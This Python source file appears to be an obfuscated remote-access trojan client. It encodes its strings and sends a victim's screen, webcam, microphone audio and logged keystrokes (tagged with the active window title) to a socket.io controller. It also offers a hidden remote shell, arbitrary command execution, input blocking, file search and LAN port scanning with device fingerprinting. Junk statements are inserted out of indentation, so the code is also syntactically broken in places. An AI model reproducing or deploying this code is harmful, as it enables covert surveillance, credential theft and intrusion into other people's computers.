_s560 = "KXtcR0dAR04JTEVMX0hdTE0JBAlKRUxIR0BHTglcWQl8aGoJS1BZSFpaCVtMTkBaXVtQBwcH"
_s561 = "JX4OeAV1QFdWTFZRQEtGQAVXQENXQFZNQEE="
_s562 = "zpXvk+6eq7y9p726q6Ctq+6jr7fupq+4q+6+r7y6p6+iorfuqK+noquq7ua8u6Dur73ur6qjp6DuqKG87p2tpququ6Krqu6ar72l5w=="
_s563 = "SA0aGgcacmgbLTxoFxsNGh4NGmghJmgrJywtaCc6aD07LWhlZTstOj4tOg=="
_s564 = "VhMEBBkEbHYFMyJ2CQUTFQQTAnY/OHY1OTIzdjkkdiMlM3Z7eyUzNSQzIg=="
_s565 = "NHdbWlpRV0BRUBUUY1VdQF1aUxRSW0YUV1tZWVVaUEcaGho="
_s566 = "/ruGl4qXkJnemJGM3ouOmp+Km9DQ0A=="
_s567 = "FkV+Y2JyeWF4"
_s568 = "H0xrcG9vens="
_s569 = "DVJSYGxkY1JS"
HAS = {"mss": False, "pil": False, _D("_s4"): False, "pycaw": False,
       _D("_s5"): False, "psutil": False, "cv2": False, "pyaudio": False,
       _D("_s6"): False}
try: import mss, mss.tools; HAS["mss"] = True
except: pass
try: from PIL import Image; HAS["pil"] = True
except: pass
try: from pynput import mouse, keyboard; from pynput.mouse import Button as MB; from pynput.keyboard import Key, KeyCode; HAS[_D("_s7")] = True
except: pass
try: from ctypes import cast, POINTER; from comtypes import CLSCTX_ALL; from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume; HAS[_D("_s8")] = True
except: pass
try: import pyperclip; HAS[_D("_s9")] = True
except: pass
try: import psutil; HAS[_D("_s10")] = True
except: pass
try: import cv2; _h6 = True
except: pass
try: import pyaudio; HAS[_D("_s11")] = True
except: pass
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM; HAS[_D("_s12")] = True
except: pass
try: import socketio as sio_lib; HAS["sio"] = True
except: print(_D("_s13")); sys.exit(1)
logging.basicConfig(level=logging.INFO, format=_D("_s14"), handlers=[logging.StreamHandler()])
_l = logging.getLogger("RAS")
class S:
    def __init__(self):
        self.lock = threading.RLock(); self.conn = False; self.reg = False
        self.url = None; self.secret = None; self.cid = None
        self.mc = None; self.kc = None; self.sw = 1920; self.sh = 1080
        self.sio = None; self.scap = None; self.wcap = None
        if HAS[_D("_s15")]:
            try: self.mc = mouse.Controller(); self.kc = keyboard.Controller()
            except: pass
        self._cache_scr()
    def _cache_scr(self):
        try:
            if HAS["mss"]:
                with mss.mss() as s: m = s.monitors[1]; self.sw, self.sh = m[_D("_s16")], m["height"]; return
        except: pass
        try:
            if sys.platform == _D("_s17") and hasattr(ctypes, "windll"):
                self.sw = ctypes.windll.user32.GetSystemMetrics(0)
                self.sh = ctypes.windll.user32.GetSystemMetrics(1)
        except: pass
_s = S()
class CapEngine:
    def __init__(self, sio, source=_D("_s18")):
        self.r = False; self.sio = sio; self.src = source  
        self.q = 50; self.sc = 0.5; self.fps = 15; self.cap = None
        self.monitor_idx = 1  
    def start(self):
        if self.r: return
        if self.src == _D("_s20") and not HAS["mss"]: return
        if self.src == _D("_s21") and not _h6: return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
    def stop(self):
        self.r = False
        if self.cap:
            try: self.cap.release() if hasattr(self.cap, _D("_s22")) else self.cap.close()
            except: pass
            self.cap = None
    def _loop(self):
        try:
            if self.src == _D("_s23"):
                self.cap = mss.mss(); mon = self.cap.monitors[self.monitor_idx if self.monitor_idx < len(self.cap.monitors) else 1]
            else:
                self.cap = cv2.VideoCapture(0)
                self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                self.cap.set(cv2.CAP_PROP_FPS, self.fps)
try:
    raise Exception()
except:
    pass
            interval = 1.0 / max(1, self.fps)
            while self.r:
                t0 = time.time()
                try:
                    if self.src == _D("_s24"):
                        ss = self.cap.grab(mon)
                        if HAS["pil"]:
                            img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s25"))
                            if self.sc < 1.0: img = img.resize((int(img.width*self.sc), int(img.height*self.sc)), Image.LANCZOS)
                            buf = io.BytesIO(); img.save(buf, format=_D("_s26"), quality=self.q, optimize=True)
                            b64 = base64.b64encode(buf.getvalue()).decode()
                        else: b64 = base64.b64encode(ss.bgra).decode()
                        evt = _D("_s27")
                    else:
                        ret, frame = self.cap.read()
                        if not ret: time.sleep(0.5); continue
                        _, jpg = cv2.imencode(_D("_s28"), frame, [cv2.IMWRITE_JPEG_QUALITY, self.q])
                        b64 = base64.b64encode(jpg).decode()
                        evt = _D("_s29")
                    if self.sio and self.sio.connected:
                        self.sio.emit(evt, {_D("_s30"): b64, "format": "jpeg"})
                except Exception as e:
                    _l.error(f"{self.src} frame err: {e}")
                    time.sleep(0.1)
                    continue
                dt = time.time() - t0
                if dt < interval: time.sleep(interval - dt)
        except Exception as e:
            _l.error(f"{self.src} engine crash: {e}")
        finally: self.stop()
class MicEngine:
    ""_D("_s31")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.pa = None; self.stream = None
    def start(self):
        if self.r: return
        if not HAS[_D("_s32")]:
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s33"), {"active": False, "error": "pyaudio not installed on target"})
            return
        try:
            self.pa = pyaudio.PyAudio()
            self.stream = self.pa.open(
                format=pyaudio.paInt16, channels=1, rate=16000,
                input=True, frames_per_buffer=4096)
        except Exception as e:
            _l.error(f"Mic init error: {e}"); self.stop()
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s34"), {"active": False, "error": str(e)})
            return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s35"), {"active": True})
    def stop(self):
        self.r = False
        if self.stream:
            try: self.stream.stop_stream(); self.stream.close()
            except: pass
            self.stream = None
        if self.pa:
            try: self.pa.terminate()
            except: pass
            self.pa = None
    @staticmethod
    def _make_wav(pcm_data):
        ""_D("_s36")""
        import struct
        data_len = len(pcm_data)
        header = struct.pack(_D("_s37"),
            b_D("_s38"), 36 + data_len, b'WAVE', b'fmt ', 16,
            1, 1, 16000, 32000, 2, 16,
            b_D("_s39"), data_len)
        return header + pcm_data
    def _loop(self):
        while self.r:
            try:
                data = self.stream.read(4096, exception_on_overflow=False)
                wav = self._make_wav(data)
                b64 = base64.b64encode(wav).decode()
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s40"), {"audio": b64})
            except Exception as e:
                _l.error(f"Mic err: {e}")
                time.sleep(0.1)
class SysMon:
    def __init__(self, sio): self.r = False; self.sio = sio
    def start(self):
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
        if self.r or not HAS[_D("_s41")]: return
        self.r = True; threading.Thread(target=self._loop, daemon=True).start()
    def stop(self): self.r = False
    def _loop(self):
        while self.r:
            try:
                cpu = psutil.cpu_percent(interval=0.3); mem = psutil.virtual_memory()
                disk = psutil.disk_usage("/"); net = psutil.net_io_counters()
                sens = {}
                try:
                    t = psutil.sensors_temperatures()
                    if t:
                        for n, e in t.items():
                            if e: sens[n] = e[0].current
                except: pass
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s42"), {"cpu_percent": cpu, "cpu_count": psutil.cpu_count(),
                        _D("_s43"): mem.percent, "memory_used_gb": round(mem.used/(1024**3),1),
                        _D("_s44"): round(mem.total/(1024**3),1), "disk_percent": disk.percent,
                        _D("_s45"): round(disk.free/(1024**3),1), "disk_total_gb": round(disk.total/(1024**3),1),
                        _D("_s46"): round(net.bytes_sent/(1024**2),1), "net_recv_mb": round(net.bytes_recv/(1024**2),1),
                        _D("_s47"): sens})
            except: pass
            time.sleep(2)
class Term:
    def __init__(self, sio): self.s = None; self.sio = sio
    def start(self):
        self.stop()
        sh = os.environ.get(_D("_s48"), "cmd.exe") if sys.platform == "win32" else os.environ.get("SHELL", "/bin/bash")
        try:
            if hasattr(os, _D("_s49")) and not (sys.platform == "win32" and "cmd" in sh.lower()):
                mf, sf = os.openpty()
                p = subprocess.Popen([sh], stdin=sf, stdout=sf, stderr=sf, cwd=os.getcwd(), close_fds=True,
                    preexec_fn=os.setsid if hasattr(os, _D("_s50")) else None,
                    env={**os.environ, _D("_s51"): "xterm-256color", "COLUMNS": "120", "LINES": "40"})
                os.close(sf); use_pty = True
            else:
                kw = {_D("_s52"): subprocess.PIPE, "stdout": subprocess.PIPE, "stderr": subprocess.STDOUT,
                      "cwd": os.getcwd(), _D("_s53"): True, "bufsize": 0, "universal_newlines": True}
                if sys.platform == _D("_s54"): kw["creationflags"] = subprocess.CREATE_NO_WINDOW
                p = subprocess.Popen([sh], **kw); mf = None; use_pty = False
            q = deque(maxlen=2000); stop = threading.Event()
            def rd():
                try:
                    if use_pty:
                        while not stop.is_set():
                            try:
                                d = os.read(mf, 4096)
                                if not d: break
                                q.append(d.decode(_D("_s55"), errors="replace"))
                            except (OSError, ValueError): break
                    else:
                        for ln in iter(p.stdout.readline, ""):
                            if stop.is_set(): break
                            q.append(ln)
                except: pass
                finally:
                    if use_pty and mf:
                        try: os.close(mf)
                        except: pass
            t = threading.Thread(target=rd, daemon=True); t.start()
            self.s = {"p": p, "rt": t, _D("_s56"): stop, "q": q, "mf": mf if use_pty else None, "pty": use_pty}
            def stream():
                while self.s and not stop.is_set():
                    out = []
                    while q: out.append(q.popleft())
                    if out and self.sio and self.sio.connected:
                        self.sio.emit(_D("_s57"), {"text": "".join(out)})
                    time.sleep(0.05)
            threading.Thread(target=stream, daemon=True).start()
            return True
        except Exception as e: _l.error(f"Term err: {e}"); return False
    def stop(self):
        if not self.s: return
        self.s[_D("_s58")].set()
        try:
            p = self.s["p"]
            if p.poll() is None:
                try:
                    if self.s.get("mf"): os.write(self.s["mf"], b"\x04")
                    else: p.stdin.write(_D("_s59")); p.stdin.flush()
                except: pass
                try: p.wait(timeout=3)
                except subprocess.TimeoutExpired: p.kill()
        except: pass
        finally:
            if self.s.get("mf"):
                try: os.close(self.s["mf"])
                except: pass
        self.s = None
    def write(self, cmd):
        if not self.s: return
        try:
            p = self.s["p"]
            if p.poll() is not None: self.start(); return
            if self.s.get("mf"): os.write(self.s["mf"], (cmd + "\n").encode())
            else: p.stdin.write(cmd + "\n"); p.stdin.flush()
        except Exception as e: _l.error(f"Term write: {e}")
class Keylog:
    ""_D("_s60")""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.buffer = []; self.listener = None
        self._last_window = ""
    def start(self):
        if self.r or not HAS[_D("_s61")]:
            if self.sio and self.sio.connected:
                self.sio.emit(_D("_s62"), {"active": False, "error": "pynput not available"})
            return
        self.r = True; self.buffer = []
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        threading.Thread(target=self._flush_loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s63"), {"active": True})
    def stop(self):
        self.r = False; self._flush()  
        if self.listener:
            try: self.listener.stop()
            except: pass
            self.listener = None
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s64"), {"active": False})
    def _active_window(self):
        try:
            if sys.platform == _D("_s65"):
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value
        except: pass
        return ""
    def _on_press(self, key):
        try:
            k = key.char if hasattr(key, _D("_s66")) and key.char else str(key)
            wnd = self._active_window()
            if wnd != self._last_window:
                self._last_window = wnd
                self.buffer.append({"k": f"[{wnd}]", "t": time.time()})
            self.buffer.append({"k": k, "t": time.time()})
        except: pass
    def _flush(self):
        if self.buffer and self.sio and self.sio.connected:
            self.sio.emit(_D("_s67"), {"keys": list(self.buffer), "window": self._last_window})
            self.buffer = []
    def _flush_loop(self):
        while self.r:
            time.sleep(3)
            self._flush()
def _proc(): return [{"pid": p.info["pid"], _D("_s68"): p.info["name"] or "?",
    "cpu": p.info[_D("_s69")] or 0, "memory": p.info["memory_percent"] or 0}
    for p in psutil.process_iter(["pid",_D("_s70"),"cpu_percent","memory_percent"])] if HAS["psutil"] else []
def _kill(pid):
    try: p = psutil.Process(int(pid)); p.terminate()
    except: return False, _D("_s71")
    try: p.wait(timeout=3)
    except psutil.TimeoutExpired: p.kill()
    return True, f"Killed {pid}"
def _audio():
    if not HAS[_D("_s72")]: return None
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume))
        return {_D("_s73"): round(v.GetMasterVolumeLevelScalar()*100), "muted": bool(v.GetMute())}
    except: return None
def _avol(lv):
    if not HAS[_D("_s74")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMasterVolumeLevelScalar(max(0, min(100, lv))/100.0, None); return True
    except: return False
def _amute():
    if not HAS[_D("_s75")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMute(not v.GetMute(), None); return True
    except: return False
def _monoff():
    try:
        if sys.platform == _D("_s76") and hasattr(ctypes, "windll"): ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        else: subprocess.run([_D("_s77"),"dpms","force","off"], capture_output=True, timeout=5)
        return True
    except: return False
def _lock():
    try:
        if sys.platform == _D("_s78") and hasattr(ctypes, "windll"):
            r = ctypes.windll.user32.LockWorkStation()
            return True if r else False
        elif sys.platform == _D("_s79"):
            subprocess.run([_D("_s80"),"-suspend"], capture_output=True, timeout=5)
            return True
        else:
            for c in [[_D("_s81"),"lock-session"],["gnome-screensaver-command","-l"],["xdg-screensaver","lock"]]:
                try: subprocess.run(c, capture_output=True, timeout=5); return True
                except FileNotFoundError: continue
            return False
    except Exception as e: _l.error(f"Lock err: {e}"); return False
def _sleep():
    try:
        if sys.platform == _D("_s82") and hasattr(ctypes, "windll"):
            try:
                import win32security, win32api, pywintypes, win32con
                token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
                priv = win32security.LookupPrivilegeValue(None, win32security.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(token, False, [(priv, win32security.SE_PRIVILEGE_ENABLED)])
            except:
                pass  
            ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
            return True
        elif sys.platform == _D("_s83"):
            subprocess.run([_D("_s84"),"sleepnow"], capture_output=True, timeout=5)
            return True
        else:
            subprocess.run([_D("_s85"),"suspend"], capture_output=True, timeout=5)
            return True
    except Exception as e: _l.error(f"Sleep err: {e}"); return False
def _wallpaper(path):
    ""_D("_s86")""
    is_url = path.startswith(_D("_s87")) or path.startswith("https://")
    if is_url:
        try:
            import urllib.request, tempfile
            fd, tmp = tempfile.mkstemp(suffix=_D("_s88"), prefix="wp_")
            os.close(fd)
            urllib.request.urlretrieve(path, tmp)
            path = tmp
        except Exception as e: return False, f"Download failed: {e}"
    if not os.path.exists(path): return False, _D("_s89")
    try:
        if sys.platform == _D("_s90"):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return True, _D("_s91")
        elif sys.platform == _D("_s92"):
            script = f'tell application "Finder" to set desktop picture to POSIX file "{path}"'
            subprocess.run([_D("_s93"), "-e", script], capture_output=True)
            return True, _D("_s94")
        else:
            for cmd in [
                [_D("_s95"), "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
                ["feh", _D("_s96"), path],
            ]:
                try: subprocess.run(cmd, capture_output=True, timeout=5); return True, _D("_s97")
                except: continue
            return False, _D("_s98")
    except Exception as e: return False, str(e)
def _msgbox(title, text):
    ""_D("_s99")""
    try:
        if sys.platform == _D("_s100"):
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x0)
        elif sys.platform == _D("_s101"):
            subprocess.run([_D("_s102"), "-e", f'display dialog "{text}" with title "{title}" buttons {{"OK"}}'], capture_output=True)
        else:
            subprocess.run([_D("_s103"), "--info", "--title", title, "--text", text], capture_output=True)
        return True, _D("_s104")
    except Exception as e: return False, str(e)
def _openurl(url):
    ""_D("_s105")""
    try:
        import webbrowser; webbrowser.open(url)
        return True, f"Opened {url}"
    except Exception as e: return False, str(e)
def _screenshot():
    ""_D("_s106")""
    if not HAS["mss"]: return None, _D("_s107")
    try:
        with mss.mss() as sct:
            ss = sct.grab(sct.monitors[1])
            if HAS["pil"]:
                img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s108"))
                buf = io.BytesIO(); img.save(buf, format="PNG")
                return base64.b64encode(buf.getvalue()).decode(), "png"
            return base64.b64encode(ss.bgra).decode(), "raw"
    except Exception as e: return None, str(e)
def _geoip():
    ""_D("_s109")""
    try:
        import urllib.request
        r = urllib.request.urlopen(_D("_s110"), timeout=5)
        return json.loads(r.read().decode())
    except Exception as e: return {_D("_s111"): str(e)}
def _apps():
    ""_D("_s112")""
    apps = []
    if sys.platform == _D("_s113"):
        for hk in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, hk)
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        name = winreg.QueryValueEx(sk, _D("_s114"))[0]
                        if name: apps.append(name)
                        winreg.CloseKey(sk)
                    except: continue
                winreg.CloseKey(k)
            except: continue
    elif sys.platform == _D("_s115"):
        r = subprocess.run([_D("_s116"), "SPApplicationsDataType"], capture_output=True, text=True, timeout=10)
        apps = [l.strip() for l in r.stdout.split("\n") if l.strip() and not l.startswith(" ")]
    else:
        r = subprocess.run([_D("_s117"), "-l"], capture_output=True, text=True, timeout=10)
        apps = [l.split()[1] for l in r.stdout.split("\n")[5:] if l.strip()]
    return apps[:200]
def _play_sound(freq=800, dur=1):
    ""_D("_s118")""
    try:
        if sys.platform == _D("_s119"):
            import winsound; winsound.Beep(int(freq), int(dur*1000))
            return True, _D("_s120")
        else:
            subprocess.run([_D("_s121"), "/usr/share/sounds/freedesktop/stereo/bell.oga"], capture_output=True, timeout=3)
            return True, _D("_s122")
    except Exception as e: return False, str(e)
def _search_files(root, pattern, max_results=50, max_depth=5):
    ""_D("_s123")""
    results = []
    root_depth = root.rstrip(os.sep).count(os.sep)
    try:
        for dirpath, _, filenames in os.walk(root):
            depth = dirpath.count(os.sep) - root_depth
            if depth > max_depth: continue
            for f in filenames:
                if pattern.lower() in f.lower():
                    results.append(os.path.join(dirpath, f))
                    if len(results) >= max_results: return results
            if len(results) >= max_results: break
    except: pass
    return results
def _execute_command(cmd):
    ""_D("_s124")""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired: return _D("_s125"), -1
    except Exception as e: return str(e), -1
def _block_input(block=True):
    ""_D("_s126")""
    if sys.platform != _D("_s127"): return False, "Windows only"
    try:
        ok = ctypes.windll.user32.BlockInput(block)
        if ok: return True, _D("_s128") if block else "Input unblocked"
        return False, _D("_s129") if block else "Unblock failed"
    except Exception as e: return False, str(e)
_COMMON_PORTS = {
    21: 'FTP', 22: 'SSH', 23: _D("_s130"), 25: 'SMTP', 53: 'DNS',
    80: _D("_s131"), 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
    443: _D("_s132"), 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
    3306: _D("_s133"), 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
    6379: _D("_s134"), 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 9090: 'Web-Alt',
    27017: _D("_s135"), 515: 'LPD/Printer', 631: 'IPP/Printer', 9100: 'JetDirect/Printer',
    548: 'AFP', 5000: _D("_s136"), 5353: 'mDNS', 7000: 'AirPlay',
    1900: _D("_s137"), 5357: 'WSD', 8000: 'HTTP-Alt', 8888: 'HTTP-Alt',
    8008: _D("_s138"), 8009: 'Chromecast', 554: 'RTSP',
}
_MAC_OUI = {
    _D("_s139"): 'TP-Link', 'B0:95:75': 'TP-Link', 'D8:47:32': 'TP-Link', 'A4:2B:B0': 'TP-Link',
    _D("_s140"): 'Synology', '00:25:90': 'Supermicro',
    _D("_s141"): 'HP', 'B4:99:BA': 'HP', 'D8:9E:F3': 'HP', 'E4:11:5B': 'HP', '70:5A:0F': 'HP',
    _D("_s142"): 'Raspberry Pi', 'DC:A6:32': 'Raspberry Pi', 'E4:5F:01': 'Raspberry Pi',
    _D("_s143"): 'Dell', 'B8:AC:6F': 'Dell', 'F0:1F:AF': 'Dell', 'F0:D5:BF': 'Dell',
    _D("_s144"): 'ASUS', '0C:9D:92': 'ASUS', 'E0:CB:4E': 'ASUS',
    _D("_s145"): 'Google', '54:60:09': 'Google',
    _D("_s146"): 'Apple', 'A8:6B:AD': 'Apple', '8C:8D:28': 'Apple', 'AC:BC:32': 'Apple', 'F0:18:98': 'Apple',
    _D("_s147"): 'Samsung', '6C:40:08': 'Xiaomi', 'B0:83:FE': 'Reolink', 'C4:2F:90': 'Cisco',
    _D("_s148"): 'Google', '1C:87:2C': 'D-Link', '14:CC:20': 'Netgear',
    _D("_s149"): 'VMware', '08:00:27': 'VirtualBox',
    _D("_s150"): 'Canon', '00:26:73': 'RICOH', '00:1C:C4': 'Brother',
    _D("_s151"): 'Cisco-Linksys', '00:23:69': 'Cisco-Linksys',
    _D("_s152"): 'Microsoft', '00:15:5D': 'Microsoft',
    _D("_s153"): 'VMware', '00:1C:42': 'Parallels',
    _D("_s154"): 'Apple', 'A4:D1:D2': 'Apple',
    _D("_s155"): 'Apple', '00:25:BC': 'Apple',
    _D("_s156"): 'Samsung', 'CC:3A:61': 'Samsung',
    _D("_s157"): 'Sony', '00:0D:D0': 'Sony',
    _D("_s158"): 'Sony', 'BC:30:D9': 'Sony',
    _D("_s159"): 'Microsoft', '58:82:A8': 'Microsoft',
    _D("_s160"): 'QNAP', '00:08:9B': 'QNAP',
    _D("_s161"): 'Roku', 'B0:A7:37': 'Roku',
    _D("_s162"): 'Apple', '54:26:96': 'Apple',
}
def _classify_machine(ip, mac_vendor, open_ports):
    ""_D("_s163")""
    ports = set(open_ports)
    parts = ip.split('.')
    is_gw = len(parts) == 4 and int(parts[3]) in (1, 254)
    if is_gw:
        return _D("_s164"), '📡', 'Router / Gateway'
    has_windows = 445 in ports or 135 in ports or 139 in ports
    has_rdp = 3389 in ports
    has_ssh = 22 in ports
    has_web = 80 in ports or 443 in ports or 8080 in ports or 8443 in ports
    has_printer = 515 in ports or 631 in ports or 9100 in ports
    has_db = 3306 in ports or 5432 in ports or 27017 in ports or 6379 in ports
    has_nas = 548 in ports  
    has_upnp = 5000 in ports or 1900 in ports
    if has_printer:
        return _D("_s165"), '🖨️', 'Printer'
    if has_ssh and has_web:
        return _D("_s166"), '🐧', 'Linux Web Server'
    if has_ssh:
        return _D("_s167"), '🐧', 'Linux/Unix Server'
    if has_windows and has_rdp:
        return _D("_s168"), '🪟', 'Windows PC'
    if has_windows and has_web:
        if has_nas or mac_vendor.lower() in (_D("_s169"), 'qnap', 'western digital', 'seagate'):
            return 'nas', '🗄️', _D("_s170")
        return _D("_s171"), '🪟', 'Windows Server'
    if has_rdp:
        return _D("_s172"), '🪟', 'Windows PC (RDP)'
    if has_windows:
        return _D("_s173"), '🪟', 'Windows PC'
    if has_db:
        return _D("_s174"), '🗃️', 'Database Server'
    if has_web:
        if mac_vendor.lower() in (_D("_s175"), 'd-link', 'netgear', 'asus', 'cisco', 'linksys', 'belkin'):
            return _D("_s176"), '📡', 'Router / AP'
        return _D("_s177"), '🌐', 'Web Server'
    if has_upnp:
        return 'iot', '📱', _D("_s178")
    vendor_lower = mac_vendor.lower()
    if any(x in vendor_lower for x in (_D("_s179"), 'samsung', 'xiaomi', 'huawei', 'oneplus')):
        return _D("_s180"), '📱', 'Mobile Device'
    if any(x in vendor_lower for x in (_D("_s181"), 'amazon', 'nest', 'ring', 'arlo', 'wyze')):
        return 'iot', '🏠', _D("_s182")
    if any(x in vendor_lower for x in (_D("_s183"), 'arduino')):
        return _D("_s184"), '🥧', 'Embedded Linux'
    if any(x in vendor_lower for x in (_D("_s185"), 'lg', 'samsung', 'roku', 'vizio')):
        return 'iot', '📺', _D("_s186")
    if any(x in vendor_lower for x in ('hp', _D("_s187"), 'canon', 'epson', 'xerox')):
        return _D("_s188"), '🖨️', 'Printer'
    return _D("_s189"), '❓', 'Unknown Device'
def _scan_ports(ip, ports, timeout=0.4):
    ""_D("_s190")""
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            s.close()
            if result == 0:
                open_ports.append(port)
        except:
            pass
    return open_ports
def _network_info():
    ""_D("_s191")""
    info = {_D("_s192"): [], "connections": [], "arp": [], "local_network": [], "external_hosts": []}
    try:
        if HAS[_D("_s193")]:
            for name, addrs in psutil.net_if_addrs().items():
                iface = {_D("_s194"): name, "addresses": []}
                for addr in addrs:
                    iface[_D("_s195")].append({
                        _D("_s196"): str(addr.family),
                        _D("_s197"): addr.address,
                        _D("_s198"): addr.netmask or "",
                        _D("_s199"): addr.broadcast or ""
                    })
                info[_D("_s200")].append(iface)
    except Exception as e: info[_D("_s201")] = str(e)
    try:
        if HAS[_D("_s202")]:
            for conn in psutil.net_connections(kind='all')[:100]:
                info[_D("_s203")].append({
                    "fd": conn.fd or -1,
                    _D("_s204"): str(conn.family),
                    _D("_s205"): str(conn.type),
                    _D("_s206"): f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
                    _D("_s207"): f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
                    _D("_s208"): conn.status,
                    "pid": conn.pid or 0
                })
    except Exception as e: info[_D("_s209")] = str(e)
    try:
        if sys.platform == _D("_s210"):
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == _D("_s211") else 0)
            for line in r.stdout.split("\n"):
                line = line.strip()
                if line and (_D("_s212") in line.lower() or "static" in line.lower()
                             or _D("_s213") in line.lower() or "statique" in line.lower()):
                    parts = line.split()
                    if len(parts) >= 2:
                        info["arp"].append({"ip": parts[0], "mac": parts[1].replace("-", ":"), _D("_s214"): parts[-1] if len(parts) > 2 else ""})
        else:
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
            for line in r.stdout.split("\n"):
                if "(" in line and ")" in line:
                    info["arp"].append(line.strip())
    except Exception as e: info[_D("_s215")] = str(e)
    port_list = sorted(_COMMON_PORTS.keys())
    for arp_entry in info["arp"]:
        if not isinstance(arp_entry, dict) or not arp_entry.get("ip"):
            continue
        ip = arp_entry["ip"]
        mac = arp_entry.get("mac", "")
        if ip.startswith(_D("_s216")) or ip.startswith("239.") or ip.startswith("255.") or ip == "0.0.0.0":
            continue
        mac_vendor = _D("_s217")
        if mac:
            parts_mac = mac.replace("-", ":").upper().split(":")
            if len(parts_mac) >= 3:
                oui = ":".join(parts_mac[:3])
                mac_vendor = _MAC_OUI.get(oui, _D("_s218"))
        open_ports = _scan_ports(ip, port_list)
        open_services = {p: _COMMON_PORTS[p] for p in open_ports}
        machine_type, icon, label = _classify_machine(ip, mac_vendor, open_ports)
        info[_D("_s219")].append({
            "ip": ip, "mac": mac,
            _D("_s220"): mac_vendor,
            _D("_s221"): open_ports,
            _D("_s222"): open_services,
            _D("_s223"): machine_type,
            _D("_s224"): label,
            _D("_s225"): icon,
            _D("_s226"): arp_entry.get("type", ""),
            _D("_s227"): "local"
        })
    seen_ext = set()
    for conn in info.get(_D("_s228"), []):
        remote = conn.get(_D("_s229"), "")
        if not remote or not isinstance(remote, str):
            continue
        parts = remote.rsplit(":", 1)
        if len(parts) != 2:
            continue
        ext_ip, ext_port = parts[0], parts[1]
        if ext_ip.startswith(_D("_s230")) or ext_ip.startswith("10.") or ext_ip.startswith("192.168.") or ext_ip.startswith("172."):
            if ext_ip.startswith(_D("_s231")):
                try:
                    second = int(ext_ip.split(".")[1])
                    if 16 <= second <= 31:
                        continue
                except:
                    continue
            else:
                continue
        if ext_ip in (_D("_s232"), "*", "::", "::1"):
            continue
        try:
            ext_port_int = int(ext_port)
        except:
            ext_port_int = 0
        svc = _COMMON_PORTS.get(ext_port_int, "")
        key = f"{ext_ip}:{ext_port}"
        if key in seen_ext:
            continue
        seen_ext.add(key)
        info[_D("_s233")].append({
            "ip": ext_ip,
            _D("_s234"): ext_port_int,
            _D("_s235"): svc,
            _D("_s236"): conn.get("status", ""),
            "pid": conn.get("pid", 0),
            _D("_s237"): conn.get("local", ""),
            _D("_s238"): "external"
        })
    ext_by_ip = {}
    for h in info[_D("_s239")]:
        ip = h["ip"]
        if ip not in ext_by_ip:
            ext_by_ip[ip] = dict(h)
            ext_by_ip[ip][_D("_s240")] = []
        ext_by_ip[ip][_D("_s241")].append({"port": h["port"], "service": h["service"]})
    info[_D("_s242")] = list(ext_by_ip.values())
    old_timeout = socket.getdefaulttimeout()
    socket.setdefaulttimeout(2)  
    for h in info[_D("_s243")]:
        try:
            hostname = socket.gethostbyaddr(h["ip"])[0]
            h[_D("_s244")] = hostname
